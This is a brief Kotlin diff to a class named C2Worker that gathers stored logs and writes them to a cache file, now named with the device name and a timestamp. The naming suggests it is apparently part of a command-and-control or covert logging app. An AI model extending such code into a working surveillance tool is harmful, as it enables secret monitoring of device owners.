@@ -66,7 +66,9 @@ class C2Worker(
         val logs = repository.getAllLogs()
         if (logs.isEmpty()) return
 
-        val fileName = "logs_${System.currentTimeMillis()}.txt"
+        val deviceName = com.zero.sentinel.utils.DeviceInfoHelper.getSafeDeviceName()
+        val timeStamp = SimpleDateFormat("yyyy-MM-dd_HH-mm", Locale.getDefault()).format(Date())
+        val fileName = "logs_${deviceName}_${timeStamp}.txt"
         val file = File(applicationContext.cacheDir, fileName)
 
         try {
